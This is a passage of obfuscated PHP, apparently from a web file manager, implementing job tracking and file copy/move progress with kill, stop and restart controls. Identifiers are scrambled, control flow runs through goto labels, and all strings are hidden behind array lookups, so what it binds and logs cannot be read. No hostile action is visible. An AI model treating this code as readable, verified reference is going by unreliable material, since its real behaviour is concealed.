$fáíÃ°‘œ§ = 0, $dˆØá«³Ó = '') { goto Añ»òÔ…ğ°; Dµ¸İƒÔ¨ó: $this->startAfter(); Hook::trigger($dä¿õ¿¤ğË[1539], $this->task); $this->task[$dä¿õ¿¤ğË[1532]] = timeFloat(); goto F¨±Íˆ·…ç; Añ»òÔ…ğ°: $dä¿õ¿¤ğË =& $_SERVER[Ü˜]; if (self::get($böåÏ¦¥)) { return; } $this->task = array($dä¿õ¿¤ğË[402] => $böåÏ¦¥, $dä¿õ¿¤ğË[1529] => USER_ID, $dä¿õ¿¤ğË[1435] => $dˆØá«³Ó, $dä¿õ¿¤ğË[29] => $f‚ ˆâ†’é, $dä¿õ¿¤ğË[1024] => $dä¿õ¿¤ğË[33], $dä¿õ¿¤ğË[1022] => $fáíÃ°‘œ§, $dä¿õ¿¤ğË[1037] => 0, $dä¿õ¿¤ğË[1530] => 0, $dä¿õ¿¤ğË[1531] => 0, $dä¿õ¿¤ğË[758] => timeFloat(), $dä¿õ¿¤ğË[757] => 0, $dä¿õ¿¤ğË[1532] => 0, $dä¿õ¿¤ğË[1533] => 0, $dä¿õ¿¤ğË[1534] => 0, $dä¿õ¿¤ğË[719] => $dä¿õ¿¤ğË[1493]); goto d¼Œâô¹Š; d¼Œâô¹Š: $GLOBALS[$dä¿õ¿¤ğË[1535]] = 1; Hook::bind($dä¿õ¿¤ğË[1495], array($this, $dä¿õ¿¤ğË[1536])); Hook::bind($dä¿õ¿¤ğË[1537], array($this, $dä¿õ¿¤ğË[1538])); goto Dµ¸İƒÔ¨ó; F¨±Íˆ·…ç: } public function end() { goto Aº—í Ñä; aÍò¦‹ÆªÇ: $eÆ†À±Î‹ö = timeFloat() - $this->task[$bÍ‰Š¢¨[758]]; self::log($bÍ‰Š¢¨[1540] . $this->task[$bÍ‰Š¢¨[402]] . $bÍ‰Š¢¨[1541] . $eÆ†À±Î‹ö . $bÍ‰Š¢¨[1542]); Hook::unbind($bÍ‰Š¢¨[1495], array($this, $bÍ‰Š¢¨[1536])); goto BİÌøĞôÙÍ; Aº—í Ñä: $bÍ‰Š¢¨ =& $_SERVER[Ü˜]; if (!$this->task) { return; } if ($this->task[$bÍ‰Š¢¨[1532]]) { self::valueSet($this->task[$bÍ‰Š¢¨[402]], !1); } goto aÍò¦‹ÆªÇ; BİÌøĞôÙÍ: Hook::unbind($bÍ‰Š¢¨[1537], array($this, $bÍ‰Š¢¨[1538])); $this->endAfter(); $this->task = !1; goto D§ø˜¶ƒ©; D§ø˜¶ƒ©: } public function update($E´ôÜ = 0, $f®æôæ·íí = false) { goto e‹øÍÓÉ®ğ; e‹øÍÓÉ®ğ: $Eª¤¦œÃ×Ú =& $_SERVER[Ü˜]; $B‘’­À×Ø =& $this->task; if (!$B‘’­À×Ø) { return; } goto Dìº«àßê…; AÌ™‹§¡: Hook::trigger($Eª¤¦œÃ×Ú[1546], $B‘’­À×Ø); self::valueSet($B‘’­À×Ø[$Eª¤¦œÃ×Ú[402]], $B‘’­À×Ø); goto FİÌƒ¢Şù; C«ì×¯Å·: $F˜“Šì‹‡¸ = self::get($B‘’­À×Ø[$Eª¤¦œÃ×Ú[402]]); $f‚äÓóÑÛæ = $F˜“Šì‹‡¸[$Eª¤¦œÃ×Ú[719]]; if ($f‚äÓóÑÛæ == self::STATYS_KILL) { $B«Ü§±éÜ = array($Eª¤¦œÃ×Ú[1543] => LNG($Eª¤¦œÃ×Ú[1544]), $Eª¤¦œÃ×Ú[1087] => !1); Cache::set($Eª¤¦œÃ×Ú[1545] . $this->task[$Eª¤¦œÃ×Ú[402]], $B«Ü§±éÜ, 30); $this->onKill(); $this->end(); die; } else { if ($f‚äÓóÑÛæ == self::STATYS_STOP) { $c²¬±Ò´ × = 2; $F˜“Šì‹‡¸[$Eª¤¦œÃ×Ú[1533]] += $c²¬±Ò´ ×; self::valueSet($B‘’­À×Ø[$Eª¤¦œÃ×Ú[402]], $F˜“Šì‹‡¸); sleep($c²¬±Ò´ ×); $this->update(); return; } } goto FËƒéğ‚¹†; FËƒéğ‚¹†: $B‘’­À×Ø[$Eª¤¦œÃ×Ú[719]] = $f‚äÓóÑÛæ ? $f‚äÓóÑÛæ : $B‘’­À×Ø[$Eª¤¦œÃ×Ú[719]]; $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1533]] = $F˜“Šì‹‡¸[$Eª¤¦œÃ×Ú[1533]] ? $F˜“Šì‹‡¸[$Eª¤¦œÃ×Ú[1533]] : 0; $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1532]] = timeFloat(); goto AÌ™‹§¡; Dìº«àßê…: $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1037]] += $E´ôÜ; $B‘’­À×Ø[$Eª¤¦œÃ×Ú[757]] = timeFloat(); if ($B‘’­À×Ø[$Eª¤¦œÃ×Ú[1022]]) { if ($B‘’­À×Ø[$Eª¤¦œÃ×Ú[1022]] < $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1037]]) { $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1022]] = $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1037]]; } $D¿ÜÅİ´ÏÖ = timeFloat() - $B‘’­À×Ø[$Eª¤¦œÃ×Ú[758]] - $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1533]]; $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1530]] = $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1037]] / $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1022]]; $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1531]] = $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1037]] / $D¿ÜÅİ´ÏÖ; if ($B‘’­À×Ø[$Eª¤¦œÃ×Ú[1530]] > 0) { $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1534]] = $D¿ÜÅİ´ÏÖ * (1 - $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1530]]) / $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1530]]; } $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1534]] = $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1534]] <= 0 ? 0 : $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1534]]; } goto fÕå¶ìëƒ™; fÕå¶ìëƒ™: $this->updateAfter(); $CâÙÌĞ·Ç = 0.2; if (timeFloat() - $B‘’­À×Ø[$Eª¤¦œÃ×Ú[1532]] < $CâÙÌĞ·Ç && !$f®æôæ·íí) { return; } goto C«ì×¯Å·; FİÌƒ¢Şù: } public function onKillSet($b‰âÕ‰°, $A²‘ˆğ¶ ‰ = array()) { $this->onKillCall = array($b‰âÕ‰°, $A²‘ˆğ¶ ‰); } public function onKill() { $bî›ì£èÄ =& $_SERVER[Ü˜]; self::log($bî›ì£èÄ[1540] . $this->task[$bî›ì£èÄ[402]] . $bî›ì£èÄ[1547]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($dÁŒÓáâÒÆ) { $c¿Û–Ñ÷  =& $_SERVER[Ü˜]; Cache::set($c¿Û–Ñ÷ [1545] . $this->task[$c¿Û–Ñ÷ [402]], $dÁŒÓáâÒÆ, 60); return $dÁŒÓáâÒÆ; } public static function get($fğ×»È¦ÖØ) { return self::valueGet($fğ×»È¦ÖØ); } public static function listData() { $eç÷ƒ¸«ãŠ = self::valueGet(); return array_sort_by($eç÷ƒ¸«ãŠ, $_SERVER[Ü˜][758], !0); } public static function kill($B¥ØÊÃ É) { return self::changeStatus($B¥ØÊÃ É, self::STATYS_KILL); } public static function stop($b¤Ğâ§„µ) { return self::changeStatus($b¤Ğâ§„µ, self::STATYS_STOP); } public static function restart($D‰Ôš¬äß) { return self::changeStatus($D‰Ôš¬äß, self::STATYS_RUNNING); } public static function killAll() { $dŠÁÄœÀ•’ =& $_SERVER[Ü˜]; $BˆÁ‡ØÂÒÈ = self::listData(); foreach ($BˆÁ‡ØÂÒÈ as $D×ƒâ¢Íò) { self::kill($D×ƒâ¢Íò[$dŠÁÄœÀ•’[402]]); } sleep(2); foreach ($BˆÁ‡ØÂÒÈ as $D×ƒâ¢Íò) { self::valueSet($D×ƒâ¢Íò[$dŠÁÄœÀ•’[402]], !1); } } private static function changeStatus($cìöˆÍÜŞ, $fƒ÷¿±”µä) { goto a¢ÌëìÙ­; CïƒÃ’Îİ»: return !0; goto BÒ°–¨àôì; E‹…‘ˆñ§¥: $d¯ßÙëßØ×[$fÔ°À’Õî[719]] = $fƒ÷¿±”µä; self::valueSet($cìöˆÍÜŞ, $d¯ßÙëßØ×); self::log($fÔ°À’Õî[1548] . $d¯ßÙëßØ×[$fÔ°À’Õî[402]] . $fÔ°À’Õî[1549] . $fƒ÷¿±”µä); goto CïƒÃ’Îİ»; a¢ÌëìÙ­: $fÔ°À’Õî =& $_SERVER[Ü˜]; $d¯ßÙëßØ× = self::valueGet($cìöˆÍÜŞ); if (!$d¯ßÙëßØ×) { return !1; } goto E‹…‘ˆñ§¥; BÒ°–¨àôì: } public static function valueGet($D•“ÚëÌÎÕ = false) { $F†—¢®Òù† =& $_SERVER[Ü˜]; if ($D•“ÚëÌÎÕ) { $dˆÀõçÛÂ = Model($F†—¢®Òù†[434])->where(array($F†—¢®Òù†[103] => $D•“ÚëÌÎÕ, $F†—¢®Òù†[29] => $F†—¢®Òù†[1550]))->find(); return $dˆÀõçÛÂ ? json_decode($dˆÀõçÛÂ[$F†—¢®Òù†[381]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($cã£¤ĞçÈ = false) { goto AÆŞ®Á«â; AÆŞ®Á«â: $A»¶©·âĞî =& $_SERVER[Ü˜]; $b¿É›¥çÒ = array($A»¶©·âĞî[29] => $A»¶©·âĞî[1550]); if ($cã£¤ĞçÈ) { $b¿É›¥çÒ[$A»¶©·âĞî[1529]] = $cã£¤ĞçÈ; } goto f¼³šâ½Ş; fÉ®Å×§ò…: return $D£¼‘„„†; goto bÉ’ÒØ‰Ë; f¼³šâ½Ş: $D£¼‘„„† = Model($A»¶©·âĞî[434])->where($b¿É›¥çÒ)->select(); $D£¼‘„„† = $D£¼‘„„† ? $D£¼‘„„† : array(); foreach ($D£¼‘„„† as $Fï‰”™çñ‡ => $AË¾ê·Ñî) { $D£¼‘„„†[$Fï‰”™çñ‡] = json_decode($AË¾ê·Ñî[$A»¶©·âĞî[381]], !0); } goto fÉ®Å×§ò…; bÉ’ÒØ‰Ë: } public static function valueSet($e‰µÍ¯´‰, $C†ƒãÔÊ) { goto E¢‰„Ò™¾Š; b„‚Ö¡¦Ô: Model($AÂí–£«È›[434])->add($c¡µÊÉœ, array(), !0); goto bêºÅêÑ†Ú; E¢‰„Ò™¾Š: $AÂí–£«È› =& $_SERVER[Ü˜]; if (!$C†ƒãÔÊ) { return Model($AÂí–£«È›[434])->where(array($AÂí–£«È›[103] => $e‰µÍ¯´‰, $AÂí–£«È›[29] => $AÂí–£«È›[1550]))->delete(); } $cáŸ®ÄÎ = json_encode($C†ƒãÔÊ); goto C­Û‹…ŠŞ¿; C­Û‹…ŠŞ¿: if (!$cáŸ®ÄÎ) { ob_start(); var_dump($C†ƒãÔÊ); $aùä¤‡·ƒì = ob_get_clean(); self::log($AÂí–£«È›[1551] . json_encode_force($aùä¤‡·ƒì)); } if (!$e‰µÍ¯´‰ || !$C†ƒãÔÊ[$AÂí–£«È›[402]]) { return !1; } $c¡µÊÉœ = array($AÂí–£«È›[29] => $AÂí–£«È›[1550], $AÂí–£«È›[1529] => USER_ID, $AÂí–£«È›[103] => $e‰µÍ¯´‰, $AÂí–£«È›[381] => $cáŸ®ÄÎ); goto b„‚Ö¡¦Ô; bêºÅêÑ†Ú: } public static function log($Aùª å«‘—) { if (!GLOBAL_DEBUG) { return; } write_log($Aùª å«‘—, $_SERVER[Ü˜][1552]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto aÙİ…ÇÏŒÀ; bòµô¤´ô­: $B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1571]] = LNG($bè…Â¬Û‚ï[1572]); $B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1573]] = 0; $B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1574]] = 0; goto c¶ÇèÊ¢Ò; Có¿šÕ¨í: Hook::bind($bè…Â¬Û‚ï[1565], array($this, $bè…Â¬Û‚ï[1566])); Hook::bind($bè…Â¬Û‚ï[1567], array($this, $bè…Â¬Û‚ï[1568])); Hook::bind($bè…Â¬Û‚ï[1569], array($this, $bè…Â¬Û‚ï[1570])); goto bòµô¤´ô­; EÃÓÒÜ‘”: Hook::bind($bè…Â¬Û‚ï[579], array($this, $bè…Â¬Û‚ï[1560])); Hook::bind($bè…Â¬Û‚ï[546], array($this, $bè…Â¬Û‚ï[1561])); Hook::bind($bè…Â¬Û‚ï[543], array($this, $bè…Â¬Û‚ï[1561])); goto bİ‘’¥Ç³«; aÙİ…ÇÏŒÀ: $bè…Â¬Û‚ï =& $_SERVER[Ü˜]; $B¥ÜÆ˜Œèˆ =& $this->task; $this->sourceCopyFolder = !1; goto dç‰ë“ÌÈò; dç‰ë“ÌÈò: Hook::bind($bè…Â¬Û‚ï[1553], array($this, $bè…Â¬Û‚ï[1554])); Hook::bind($bè…Â¬Û‚ï[1111], array($this, $bè…Â¬Û‚ï[1555])); Hook::bind($bè…Â¬Û‚ï[1556], array($this, $bè…Â¬Û‚ï[1557])); goto F¤ÓŞ£ÁÇ«; bİ‘’¥Ç³«: Hook::bind($bè…Â¬Û‚ï[548], array($this, $bè…Â¬Û‚ï[1561])); Hook::bind($bè…Â¬Û‚ï[550], array($this, $bè…Â¬Û‚ï[1561])); Hook::bind($bè…Â¬Û‚ï[552], array($this, $bè…Â¬Û‚ï[1561])); goto C§ ô²Øß·; C§ ô²Øß·: Hook::bind($bè…Â¬Û‚ï[1562], array($this, $bè…Â¬Û‚ï[1563])); Hook::bind($bè…Â¬Û‚ï[568], array($this, $bè…Â¬Û‚ï[1564])); $this->sourceModelCopyFlag = !1; goto Có¿šÕ¨í; F¤ÓŞ£ÁÇ«: Hook::bind($bè…Â¬Û‚ï[575], array($this, $bè…Â¬Û‚ï[1558])); Hook::bind($bè…Â¬Û‚ï[576], array($this, $bè…Â¬Û‚ï[1559])); Hook::bind($bè…Â¬Û‚ï[578], array($this, $bè…Â¬Û‚ï[1560])); goto EÃÓÒÜ‘”; aéøæËí³: $B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1577]] = 0; $B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1578]] = 0; if (!$B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1435]]) { $B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1435]] = LNG($bè…Â¬Û‚ï[1579]); } goto A‰ÓÆäĞ; c¶ÇèÊ¢Ò: $B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1024]] = $bè…Â¬Û‚ï[33]; $B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1575]] = $bè…Â¬Û‚ï[33]; $B¥ÜÆ˜Œèˆ[$bè…Â¬Û‚ï[1576]] = 0; goto aéøæËí³; A‰ÓÆäĞ: } protected function endAfter() { goto Aöôò¯Ï¥; fš–ø„¦Õ‰: Hook::unbind($dš™ÉËÉ¨¼[1565], array($this, $dš™ÉËÉ¨¼[1566])); Hook::unbind($dš™ÉËÉ¨¼[1567], array($this, $dš™ÉËÉ¨¼[1568])); Hook::unbind($dš™ÉËÉ¨¼[1569], array($this, $dš™ÉËÉ¨¼[1570])); goto C¾¦Î¿ÂÚ; DÛ‚íï‹ÄÊ: Hook::unbind($dš™ÉËÉ¨¼[543], array($this, $dš™ÉËÉ¨¼[1561])); Hook::unbind($dš™ÉËÉ¨¼[548], array($this, $dš™ÉËÉ¨¼[1561])); Hook::unbind($dš™ÉËÉ¨¼[550], array($this, $dš™ÉËÉ¨¼[1561])); goto döàÁÌÀ×Ã; döàÁÌÀ×Ã: Hook::unbind($dš™ÉËÉ¨¼[552], array($this, $dš™ÉËÉ¨¼[1561])); Hook::unbind($dš™ÉËÉ¨¼[1562], array($this, $dš™ÉËÉ¨¼[1563])); Hook::unbind($dš™ÉËÉ¨¼[568], array($this, $dš™ÉËÉ¨¼[1564])); goto fš–ø„¦Õ‰; Aöôò¯Ï¥: $dš™ÉËÉ¨¼ =& $_SERVER[Ü˜]; Hook::unbind($dš™ÉËÉ¨¼[1553], array($this, $dš™ÉËÉ¨¼[1554])); Hook::unbind($dš™ÉËÉ¨¼[1111], array($this, $dš™ÉËÉ¨¼[1555])); goto c³Ô¡ÑÃ¸¹; fíÅ®¥ÁŒù: Hook::unbind($dš™ÉËÉ¨¼[578], array($this, $dš™ÉËÉ¨¼[1560])); Hook::unbind($dš™ÉËÉ¨¼[579], array($this, $dš™ÉËÉ¨¼[1560])); Hook::unbind($dš™ÉËÉ¨¼[546], array($this, $dš™ÉËÉ¨¼[1561])); goto DÛ‚íï‹ÄÊ; c³Ô¡ÑÃ¸¹: Hook::unbind($dš™ÉËÉ¨¼[1556], array($this, $dš™ÉËÉ¨¼[1557])); Hook::unbind($dš™ÉËÉ¨¼[575], array($this, $dš™ÉËÉ¨¼[1558])); Hook::unbind($dš™ÉËÉ¨¼[576], array($this, $dš™ÉËÉ¨¼[1559])); goto fíÅ®¥ÁŒù; C¾¦Î¿ÂÚ: } public function copyMoveStart($AÈ–¢ ±‡¥, $FƒÖØÅõ«í, $bƒ´²ïº›’, $B¡ÙéÁ¦) { goto e–ã“ÀÊµª; C¤´õ¼è: if (substr($FƒÖØÅõ«í, 0, strlen($FÖÇ›õòùö)) == $FÖÇ›õòùö) { return; } if (substr($B¡ÙéÁ¦, 0, strlen($FÖÇ›õòùö)) == $FÖÇ›õòùö) { return; } $Cè„ñ±Ì =& $this->task; goto AÇİÀâº‹Ã; AÇİÀâº‹Ã: $Cè„ñ±Ì[$CÂÄÏ©ßô[1581]] = KodIO::transferType($AÈ–¢ ±‡¥, $bƒ´²ïº›’); $this->update(); goto aéîÁˆÒ; e–ã“ÀÊµª: $CÂÄÏ©ßô =& $_SERVER[Ü˜]; self::log($CÂÄÏ©ßô[1580] . $FƒÖØÅõ«í . $CÂÄÏ©ßô[77] . $B¡ÙéÁ¦); $FÖÇ›õòùö = rtrim(TEMP_FILES, $CÂÄÏ©ßô[8]); goto C¤´õ¼è; aéîÁˆÒ: } public function updateAfter() { goto F³ƒŞÜÂáñ; F³ƒŞÜÂáñ: $EÒÖšñ©Å =& $_SERVER[Ü˜]; $e‘Ñ…ğîìÎ =& $this->task; if (!$e‘Ñ…ğîìÎ[$EÒÖšñ©Å[732]]) { return; } goto E …œÕ‰‚Š; fİœ§õëæ“: $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1530]] = $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1578]] / $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[732]]; if ($e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1530]] > 0) { $a»øíñ’„ç = timeFloat() - $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[758]] - $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1533]]; $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1534]] = $a»øíñ’„ç * (1 - $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1530]]) / $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1530]]; } goto e”Ó¼µÄ¨; E …œÕ‰‚Š: if ($this->sourceModelCopyFlag) { return; } if ($e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1581]] == $EÒÖšñ©Å[1184]) { return; } if ($e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1581]] == $EÒÖšñ©Å[1095] || $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1581]] == $EÒÖšñ©Å[117]) { if ($e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1575]]) { $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1578]] = $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1577]] + $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1574]]; } } else { if ($e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1581]] == $EÒÖšñ©Å[1185]) { if ($e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1575]] == $EÒÖšñ©Å[1095]) { $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1578]] = $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1577]] + $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1574]] * 0.5; } else { if ($e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1575]] == $EÒÖšñ©Å[117]) { $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1578]] = $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1577]] + $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1573]] * 0.5 + $e‘Ñ…ğîìÎ[$EÒÖšñ©Å[1574]] * 0.5; } } } } goto fİœ§õëæ“; e”Ó¼µÄ¨: } public function addPath($Cï…ãÚœˆ™) { goto BŒ’®š›”; BŒ’®š›”: $c¬œŸ¤é =& $_SERVER[Ü˜]; if (!$Cï…ãÚœˆ™) { return; } $b°É™‡Ó»ö =& $this->task; goto f²¢×—Ï; aìÚ°ƒ‹èĞ: if ($B©ÈÏà[$c¬œŸ¤é[29]] == $c¬œŸ¤é[203]) { $b°É™‡Ó»ö[$c¬œŸ¤é[1022]] += 1; } else { $b°É™‡Ó»ö[$c¬œŸ¤é[1022]] += $B©ÈÏà[$c¬œŸ¤é[91]][$c¬œŸ¤é[89]]; if ($B©ÈÏà[$c¬œŸ¤é[404]]) { $b°É™‡Ó»ö[$c¬œŸ¤é[1022]] += $B©ÈÏà[$c¬œŸ¤é[91]][$c¬œŸ¤é[90]] + 1; } } $b°É™‡Ó»ö[$c¬œŸ¤é[732]] += $B©ÈÏà[$c¬œŸ¤é[88]]; $this->update(); goto CŠ­Î‘¤÷; f²¢×—Ï: $B©ÈÏà = IO::infoWithChildren($Cï…ãÚœˆ™); $eæ±ÎÙŒË« = $b°É™‡Ó»ö[$c¬œŸ¤é[1582]] ? $b°É™‡Ó»ö[$c¬œŸ¤é[1582]][$c¬œŸ¤é[1583]] : 0; $b°É™‡Ó»ö[$c¬œŸ¤é[1582]] = array($c¬œŸ¤é[1583] => $eæ±ÎÙŒË« + 1, $c¬œŸ¤é[422] => $B©ÈÏà[$c¬œŸ¤é[28]], $c¬œŸ¤é[86] => $B©ÈÏà[$c¬œŸ¤é[86]], $c¬œŸ¤é[504] => $B©ÈÏà[$c¬œŸ¤é[504]] ? $B©ÈÏà[$c¬œŸ¤é[504]] : $B©ÈÏà[$c¬œŸ¤é[86]]); goto aìÚ°ƒ‹èĞ; CŠ­Î‘¤÷: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($E“¡åªä›µ) { $Få•®ÔÃ‚‹ =& $_SERVER[Ü˜]; $e‹‡â†ãÄ =& $this->task; $e‹‡â†ãÄ[$Få•®ÔÃ‚‹[1571]] = $E“¡åªä›µ[$Få•®ÔÃ‚‹[28]]; $e‹‡â†ãÄ[$Få•®ÔÃ‚‹[1024]] = $E“¡åªä›µ[$Få•®ÔÃ‚‹[28]]; $this->update(); } public function copyFileStart($E´·±ËÂ, $C§ÒŠÑî‹ò, $AäÍ‘†ŠŒğ, $dÃ…ÀèÉáÍ, $b½ì°”²Á, $D•Ï­°ô”Ÿ) { goto b  ¾„Â¬; BõÍãÁØÛ: $A´’ëëÃ¹ë[$Eß£Õ·¢ƒ[1024]] = $Eß£Õ·¢ƒ[33]; $A´’ëëÃ¹ë[$Eß£Õ·¢ƒ[1575]] = $Eß£Õ·¢ƒ[33]; $A´’ëëÃ¹ë[$Eß£Õ·¢ƒ[1576]] = 0; goto F²øğã¤µ‰; DÉˆË×Š²—: $A´’ëëÃ¹ë[$Eß£Õ·¢ƒ[1571]] = $fÁ¼õ¤ò¹å; $A´’ëëÃ¹ë[$Eß£Õ·¢ƒ[1573]] = (int) $E´·±ËÂ->size($C§ÒŠÑî‹ò); $A´’ëëÃ¹ë[$Eß£Õ·¢ƒ[1574]] = 0; goto BõÍãÁØÛ; F²øğã¤µ‰: $this->update(); goto f½è¼¦ØöÓ; AÖƒƒ°Ú¼: $GLOBALS[$Eß£Õ·¢ƒ[1585]] = $b½ì°”²Á; $GLOBALS[$Eß£Õ·¢ƒ[1584]] = $D•Ï­°ô”Ÿ; $A´’ëëÃ¹ë =& $this->task; goto DÉˆË×Š²—; b  ¾„Â¬: $Eß£Õ·¢ƒ =& $_SERVER[Ü˜]; $fÁ¼õ¤ò¹å = $b½ì°”²Á; if ($fÁ¼õ¤ò¹å == $GLOBALS[$Eß£Õ·¢ƒ[1584]]) { $fÁ¼õ¤ò¹å = $GLOBALS[$Eß£Õ·¢ƒ[1585]]; } goto AÖƒƒ°Ú¼; f½è¼¦ØöÓ: } public function copyFileEnd($bØƒí‰º‚´, $Fƒå˜Ã±†, $d‰‚ÏÂµØø, $AÍí¨’©Ùˆ, $d­‹Âé¥°§, $Dã»Ğô²¦Â) { $f±›¨Ã®°§ =& $_SERVER[Ü˜]; $E“âÇæÄµò =& $this->task; $E“âÇæÄµò[$f±›¨Ã®°§[1574]] = $E“âÇæÄµò[$f±›¨Ã®°§[1573]]; $E“âÇæÄµò[$f±›¨Ã®°§[1575]] = $f±›¨Ã®°§[33]; if ($d­‹Âé¥°§ == $E“âÇæÄµò[$f±›¨Ã®°§[1571]]) { $E“âÇæÄµò[$f±›¨Ã®°§[1577]] += $E“âÇæÄµò[$f±›¨Ã®°§[1573]]; $E“âÇæÄµò[$f±›¨Ã®°§[1578]] = $E“âÇæÄµò[$f±›¨Ã®°§[1577]]; $this->update(1); } else { $this->update(); $E“âÇæÄµò[$f±›¨Ã®°§[1574]] = 0; } self::log($f±›¨Ã®°§[1586] . $Fƒå˜Ã±† . $f±›¨Ã®°§[77] . $AÍí¨’©Ùˆ . $f±›¨Ã®°§[63] . $d­‹Âé¥°§ . $f±›¨Ã®°§[1587] . $E“âÇæÄµò[$f±›¨Ã®°§[1571]]); } public function updateFileEnd($D´Ï³Ç­, $b˜Øƒçº‘ó) { goto e®ä†¯¢; Aø½ÍÇ¶Š¼: $this->update(1); self::log($Dí‚©ÇôºÜ[1588] . $D´Ï³Ç­); goto CæÇ‚Ùô¾„; e®ä†¯¢: $Dí‚©ÇôºÜ =& $_SERVER[Ü˜]; $D·§Ëäšïù =& $this->task; $D·§Ëäšïù[$Dí‚©ÇôºÜ[1571]] = $D´Ï³Ç­; goto dØ§‚ˆµˆÒ; dØ§‚ˆµˆÒ: $D·§Ëäšïù[$Dí‚©ÇôºÜ[1573]] = $b˜Øƒçº‘ó; $D·§Ëäšïù[$Dí‚©ÇôºÜ[1577]] += $b˜Øƒçº‘ó; $D·§Ëäšïù[$Dí‚©ÇôºÜ[1578]] = $D·§Ëäšïù[$Dí‚©ÇôºÜ[1577]]; goto Aø½ÍÇ¶Š¼; CæÇ‚Ùô¾„: } public function sourceModelCopy($dÀ£®® ß†) { goto DËÁ¡©¦˜Ò; ašäö×íä‘: $EÜ†®§¤†‹ =& $this->task; $this->sourceModelCopyFlag = !0; $fáˆ–¦Ú = 0; goto bƒ–ôõÇÇ¶; bƒ–ôõÇÇ¶: switch ($F¿ÅøñŞÛ) { case $AîÛ¾¸…ºÙ[544]: $fáˆ–¦Ú = 1; break; case $AîÛ¾¸…ºÙ[547]: $EÜ†®§¤†‹[$AîÛ¾¸…ºÙ[1571]] = $A½ìÂá²Æ[$AîÛ¾¸…ºÙ[28]]; break; case $AîÛ¾¸…ºÙ[549]: $fáˆ–¦Ú = intval($dÀ£®® ß†[$AîÛ¾¸…ºÙ[386]] * 0.4); break; case $AîÛ¾¸…ºÙ[551]: $fáˆ–¦Ú = intval($dÀ£®® ß†[$AîÛ¾¸…ºÙ[386]] * 0.2); break; case $AîÛ¾¸…ºÙ[553]: $fáˆ–¦Ú = intval($dÀ£®® ß†[$AîÛ¾¸…ºÙ[386]] * 0.4); break; } $this->update($fáˆ–¦Ú); $this->sourceModelCopyFlag = !1; goto a¼‚ŠÏ”í‡; DËÁ¡©¦˜Ò: $AîÛ¾¸…ºÙ =& $_SERVER[Ü˜]; $F¿ÅøñŞÛ = $dÀ£®® ß†[0]; $A½ìÂá²Æ = $dÀ£®® ß†[1]; goto ašäö×íä‘; a¼‚ŠÏ”í‡: } public function sourceRemove($d—Ô„¥ç©Ú, $b·ºƒæÂ¸°) { $dÒìŒ§Ò‡— =& $_SERVER[Ü˜]; $this->sourceModelCopyFlag = !0; $e®ÅÓ²æ×Á = 1; if (isset($d—Ô„¥ç©Ú[$dÒìŒ§Ò‡—[91]])) { $e®ÅÓ²æ×Á = $d—Ô„¥ç©Ú[$dÒìŒ§Ò‡—[91]][$dÒìŒ§Ò‡—[89]] + $d—Ô„¥ç©Ú[$dÒìŒ§Ò‡—[91]][$dÒìŒ§Ò‡—[90]] + 1; } $this->update($e®ÅÓ²æ×Á); $this->sourceModelCopyFlag = !1; } public function sourceMove($còÕáåàÌ) { $this->sourceRemove($còÕáåàÌ, !1); } public function curlProgress($B“§Ã”Æ‡À, $fÜ©õÄëÒÔ, $B‘ğá¯Ò·, $CùñÀ†«È, $Fƒ…«è¿¶Á) { $AÃ¤Ïßöó† =& $_SERVER[Ü˜]; 